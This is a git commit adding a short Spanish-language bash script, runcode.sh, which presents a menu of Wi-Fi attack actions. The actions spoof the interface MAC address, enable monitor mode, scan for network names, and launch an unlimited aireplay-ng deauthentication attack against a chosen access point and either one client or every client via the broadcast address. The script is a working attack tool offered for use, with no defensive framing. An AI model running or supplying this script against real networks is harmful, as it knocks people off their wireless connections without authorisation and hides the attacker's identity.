d10f6155f07a124f360b78d6d49b4bde160fb096
Franko$avage <117610367+FrankoSav@users.noreply.github.com>
2023-01-07 17:02:25 -0300

    Create runcode.sh

---
+++ runcode.sh
@@ -0,0 +1,50 @@
+#!/bin/bash
+
+# Mostrar el menú de opciones
+while true; do
+    clear
+    echo "Elegí una opción:"
+    echo "1. Falsificar MAC y encender modo monitor"
+    echo "2. Quitar el modo monitor"
+    echo "3. Hacer un Deauth"
+    echo "4. Hacer un escaneo"
+    echo "5. Salir"
+    read -p "Opcion: " opcion
+    
+    case $opcion in
+        1)
+            # Mon mode on and changed mac
+            ifconfig wlan0 down
+            iwconfig wlan0 mode monitor
+            airmon-ng check kill
+            macchanger -br wlan0
+            ifconfig wlan0 up
+            
+            read -p "Pulsa enter para volver al menú"
+        ;;
+        2)
+            # Mon mode off
+            ifconfig wlan0 down
+            iwconfig wlan0 mode managed
+            ifconfig wlan0 up
+            /etc/init.d/networking restart
+            read -p "Enter para volver al menú"
+        ;;
+        3)
+            # Mon mode off
+            read -p "MAC del ACCES POINT objetivo: " mac_ap
+            read -p "MAC del cliente objetivo o FF:FF:FF:FF:FF:FF para atacar todos: " mac_cliente
+            aireplay-ng --deauth 0 -a $mac_ap -c $mac_cliente wlan0
+            read -p "Enter para volver al menú"
+        ;;
+        4)
+            # Scan with interface
+            iwlist wlan0 scan | grep ESSID
+            read -p "Enter para volver al menú"
+        ;;
+        5)
+            # Salir del programa
+            break
+        ;;
+    esac
+done
